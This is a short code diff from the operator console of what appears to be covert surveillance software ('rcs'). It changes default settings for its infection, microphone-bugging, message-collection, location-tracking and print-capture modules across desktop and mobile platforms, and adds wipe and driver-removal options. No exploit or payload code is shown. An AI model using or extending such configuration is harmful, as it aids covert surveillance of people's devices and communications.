@@ -104,7 +104,7 @@ package it.ht.rcs.console
           capture: false,
           minsize: 1,
           maxsize: 500000,
-          date: "2011-05-26 09:04:14",
+          date: '2010-01-01 00:00:00',
           accept: [],
           deny: [],
           _type: "desktop,mobile",
@@ -113,6 +113,10 @@ package it.ht.rcs.console
         
         {
           module: "infection",
+          local: false,
+          usb: false,
+          vm: 0,
+          mobile: false,
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -125,13 +129,18 @@ package it.ht.rcs.console
         
         {
           module: "messages",
-          mail: {filter: {maxsize: 0, datefrom: "2011-05-26 09:04:14", dateto: ''}},
+          mail: {filter: {maxsize: 0, datefrom: "2010-01-21 00:00:00", dateto: ''}},
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
         
         {
           module: "mic",
+          autosense: false,
+          silence: 5,
+          threshold: 0.22,
+          vad: false,
+          vadthreshold: 50,
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -152,12 +161,16 @@ package it.ht.rcs.console
         
         {
           module: "position",
+          gps: false,
+          cell: false,
+          wifi: true,
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
         
         {
           module: "print",
+          quality: "med",
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -210,6 +223,8 @@ package it.ht.rcs.console
       var globals:Object = {
                              quota: { "min": min, "max": max },
                              wipe: false,
+                             remove_driver: true,
+                             nohide: [],
                              type: agent.type,
                              advanced: false
                            };
